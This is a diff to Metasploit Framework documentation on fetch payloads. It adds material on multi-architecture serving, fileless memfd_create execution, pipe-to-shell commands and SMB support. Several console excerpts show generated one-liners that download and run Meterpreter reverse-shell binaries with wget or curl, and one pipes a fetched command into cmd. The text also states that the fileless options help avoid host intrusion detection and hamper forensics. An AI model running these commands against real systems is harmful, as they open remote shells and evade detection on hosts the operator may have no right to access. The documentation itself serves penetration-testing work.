@@ -24,7 +24,7 @@ cURL, or Certutil.
 
 ## Organization
 Unlike Command Stagers which are organized by binary, Fetch Payloads are organized by server. Currently, we support
-HTTP, HTTPS, and TFTP servers.  Once you select a fetch payload, you can select the binary you'd like to run on the
+HTTP, HTTPS, SMB, and TFTP servers.  Once you select a fetch payload, you can select the binary you'd like to run on the
 remote host to download the served payload prior to execution.
 
 Here is the naming convention for fetch payloads:
@@ -37,14 +37,28 @@ For example:
 3. Start a served payload handler for the served payload to call back to
 4. Generate a command to execute on a remote host that will download the served payload and run it.
 
+## Fetch Multi
+The Fetch Multi Arch payload (cmd/linux/http[s]/multi/<payload>) is a specific Linux Fetch payload type that identifies
+the architecture of the target host during the execution of the command-based stager. The command-based stager embeds
+the architecture as a query string in the download request so that the fetch server serves the right payload for the
+target architecture. This allows users to launch a remote exploit without knowing the architecture of the target
+system.
+Limitations: 
+1. The payload uses a query string to report the target arch, so it only works with HTTP[S] fetch protocol payloads.
+2. We don't support much AARCH64 on Windows, and x86 is well-emulated on Windows hosts, so for now, this only supports
+Linux.
+3. There exists a curious and annoying feature in some mips kernels that they return `mips` as the `uname -m` value.  This
+_normally_ means that the target is mipsbe, but there are some cases when it is actually mipsel/mipsle.  If your target
+reports that the uname value is 'mips' it will be served a mipsbe payload, but there will be a warning message that
+suggests you try an explicit mipsle payload if the automatic mipsbe payload fails.
 
 ## A Simple Stand-Alone Example
 The fastest way to understand Fetch Payloads is to use them and examine the output. For example, let's assume a Linux
 target with the ability to connect back to us with  an HTTP connection and a command execution vulnerability.
 First, let's look at the payload in isolation:
 ```msf
-msf6 exploit(multi/ssh/sshexec) > use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > show options
+msf exploit(multi/ssh/sshexec) > use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > show options
 
 Module options (payload/cmd/linux/http/x64/meterpreter/reverse_tcp):
 
@@ -62,42 +76,73 @@ LPORT               4444             yes       The listen port
 
 View the full module info with the info, or info -d command.
 
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
 ```
 
 ### Options
 `FETCH_COMMAND` is the binary we wish to run on the remote host to download the adapted payload.  Currently, the
 supported options are `CURL FTP TFTP TNFTP WGET` on Linux hosts and `CURL TFTP CERTUTIL` on Windows hosts.  We'll get
 into more details on the binaries later.
-`FETCH_FILENAME` is the name you'd like the executable payload saved as on the remote host.  This option is not
-supported by every binary and must end in `.exe` on Windows hosts.  The default value is random.
+
 `FETCH_SRVHOST` is the IP where the server will listen.
+
 `FETCH_SRVPORT` is the port where the server will listen.
+
 `FETCH_URIPATH` is the URI corresponding to the payload file.  The default value is deterministic based on the
 underlying payload so a payload created in msfvenom will match a listener started in Framework assuming the underlying
 served payload is the same.
+
+### Dependent Options
+`FETCH_FILELESS` is an option that specifies a method to modify the fetch command to download the binary payload to
+memory rather than disk before execution, thus avoiding some HIDS and making forensics harder.  Currently, there are
+two options: `shell`, `shell-search` and `python3.8+`. All of these require the target to be running Linux Kernel 3.17 or above.
+This option is only available when the platform is Linux.
+
+`FETCH_FILENAME` is the name you'd like the executable payload saved as on the remote host.  This option is not
+supported by every binary and must end in `.exe` on Windows hosts.  The default value is random.
+This option is only available when `FETCH_FILELESS` is set to `none`
+
+`FETCH_PIPE` is a binary flag that will create a second resource containing the original fetch command to run and then
+will produce a much shorter command to run on the host that will download the original fetch command and pipe it
+directly to the target's shell.  Use this option if there is a limit on the command size as it will result in a much
+smaller original command.  When set to true, the `FETCH_URIPATH` option is used for the pipe command resource uri and
+the default `FETCH_URIPATH`value is used for the original binary payload uri.
+This option is only available when the fetch  transport is HTTP or HTTPS and the payload platform is Linux with the 
+`FETCH_COMMAND` set to `CURL` or `WGET` or the platform is Windows and the `FETCH_COMMAND` is `CURL`
+
 `FETCH_WRITABLE_DIR` is the directory on the remote host where we'd like to store the served payload prior to execution.
-This value is not supported by all binaries.  If you set this value and it is not supported, it will generate an error.
+This value is not supported by all fetch binaries.  If you set this value and it is not supported, it will generate an error.
+This option is only available when `FETCH_FILELESS` is set to `none`
 
 The remaining options will be the options available to you in the served payload; in this case our served payload is
 `linux/x64/meterpreter/reverse_tcp` so our only added options are `LHOST` and `LPORT`.  If we had selected a different
 payload, we would see different options.
 
+### Fileless Execution
+
+For Linux payloads, we support **fileless ELF execution** - this option is enabled with `FETCH_FILELESS`. Currently, this option can be the following values: `python3.8+`, `shell-search`, and `shell`. The basic idea behind all of them is the same: execute the payload from an anonymous file handle, which should never touch a disk, thereby adding a layer of stealth. 
+
+The `shell-search` option searches for available anonymous file handles available on the system, copies the payload into the one it finds, and executes the payload from that handle. This method uses `POSIX` commands only so that it can be run in any shell. 
+
+The `shell` option uses a slightly different approach: it runs the assembly stub from a shell, creates an anonymous file handle inside of the shell process, copies the payload into a new handle, and then runs it. Finally, it will kill the original shell process, leaving the payload running as *orphan* process. This method uses a syscall `memfd_create` to create an anonymous file handle. 
+This option can be used in any Linux shell. 
+
+The `python3.8+` option uses the same technique as the `shell` option. However, it all happens in Python code. It will call the `os.memfd_create` function, which will create an anonymous file handle from the Python process. Then, it uses `os.system` to copy the payload into a new file handle and execute it. This option requires Python version 3.8 or higher on the target machine.
 ### Generating the Fetch Payload
 ```msf
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_COMMAND WGET
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_COMMAND WGET
 FETCH_COMMAND => WGET
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVHOST 10.5.135.201
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVHOST 10.5.135.201
 FETCH_SRVHOST => 10.5.135.201
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVPORT 8000
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVPORT 8000
 FETCH_SRVPORT => 8000
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LHOST 10.5.135.201
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LHOST 10.5.135.201
 LHOST => 10.5.135.201
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LPORT 4567
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LPORT 4567
 LPORT => 4567
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > generate -f raw
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > generate -f raw
 wget -qO ./YXeSdwsoEfOH http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YXeSdwsoEfOH; ./YXeSdwsoEfOH &
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
 ```
 
 You can see the fetch payload generated:
@@ -109,7 +154,7 @@ When you start the `Fetch Handler`, it starts both the server hosting the binary
 served payload.  With `verbose` set to `true`, you can see both the Fetch Handler and the Served Payload Handler are
 started:
 ```msf
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > to_handler
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > to_handler
 [*] wget -qO ./YBybOrAmkV http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YBybOrAmkV; ./YBybOrAmkV &
 [*] Payload Handler Started as Job 0
 [*] Fetch Handler listening on 10.5.135.201:8000
@@ -121,7 +166,7 @@ msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > to_handler
 The Fetch Handler is tracked with the Served Payload Handler, so you will only see the Served Payload Handler under
 `Jobs`, even though the Fetch Handler is listening:
 ```msf
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -l
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -l
 
 Jobs
 ====
@@ -130,7 +175,7 @@ Jobs
   --  ----                    -------                                     ------------
   0   Exploit: multi/handler  cmd/linux/http/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4567
 
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
 [*] exec: netstat -ant | grep 8000
 
 tcp        0      0 10.5.135.201:8000       0.0.0.0:*               LISTEN     
@@ -138,13 +183,13 @@ tcp        0      0 10.5.135.201:8000       0.0.0.0:*               LISTEN
 ```
 Killing the Served Payload handler will kill the Fetch Handler as well:
 ```msf
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -k 0
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -k 0
 [*] Stopping the following job(s): 0
 [*] Stopping job 0
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
 [*] exec: netstat -ant | grep 8000
 
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
 ```
 
 ## Using Fetch Payloads on the Fly
@@ -153,6 +198,20 @@ without relying on a session in framework or having to get a payload on target. 
 really odd situation where you can execute commands, you can get a session in framework quickly without having to upload
 a payload manually.  Just follow the steps above, and run the provided command.  Right now, the only thing we serve are
 Framework payloads, but in the future, expanding to serve and execute any executable binary would be relatively trivial.
+
+## Fetch Pipe
+If space is at a premium, you can use the `FETCH_PIPE` option.  When using `FETCH_PIPE`, the fetch server hosts two
+resources: the original binary and then the generated fetch command.  In the place of the original command, the command
+generated will be a much smaller command to download the original command and pipe it into the shell.
+The following example shows both the original command to download and execute the binary and the command to pipe the
+original fetch command directly to the shell.  Since this requires two downloads, it is less stealthy, but the
+command to run on the target is significantly shorter.
+``` msf
+msf payload(cmd/windows/http/x64/meterpreter_reverse_tcp) > to_handler
+[*] Command served: curl -so %TEMP%\DpRdBIfeyax.exe http://10.5.135.117:8080/zw3LGTh9FtaLJ4bCQRAWdw & start /B %TEMP%\DpRdBIfeyax.exe
+
+[*] Command to run on remote host: curl -s http://10.5.135.117:8080/test|cmd
+```
 
 ## Using it in an exploit
 Using Fetch Payloads is no different than using any other command payload.  First, give users access to the Fetch
@@ -255,7 +314,7 @@ Then, you can set `FetchListenerBindPort` to 3069 and get the callback correctly
 4) Because tftp is a udp-based protocol and because od the implementation of the server within Framework, each time you
 start a tftp fetch handler, a new service will start:
 ```msf
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs
 
 Jobs
 ====
@@ -264,16 +323,16 @@ Jobs
   --  ----                    -------                                       ------------
   2   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4444
 
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 4445
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 4445
 LPORT => 4445
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler
 
 [*] Command to run on remote host: curl -so plEYxIdBQna.exe tftp://10.5.135.201:8080/test1 & start /B plEYxIdBQna.exe
 [*] Payload Handler Started as Job 4
 
 [*] starting tftpserver on 10.5.135.201:8080
 [*] Started reverse TCP handler on 10.5.135.201:4445 
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs
 
 Jobs
 ====
@@ -283,23 +342,23 @@ Jobs
   2   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4444
   4   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4445
 
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
 [*] exec: netstat -an | grep 8080
 
 udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
 udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set FETCH_URIPATH test4
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set FETCH_URIPATH test4
 FETCH_URIPATH => test4
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 8547
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 8547
 LPORT => 8547
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler
 
 [*] Command to run on remote host: curl -so DOjmRoCOSMn.exe tftp://10.5.135.201:8080/test4 & start /B DOjmRoCOSMn.exe
 [*] Payload Handler Started as Job 5
 
 [*] starting tftpserver on 10.5.135.201:8080
 [*] Started reverse TCP handler on 10.5.135.201:8547 
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
 [*] exec: netstat -an | grep 8080
 
 udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
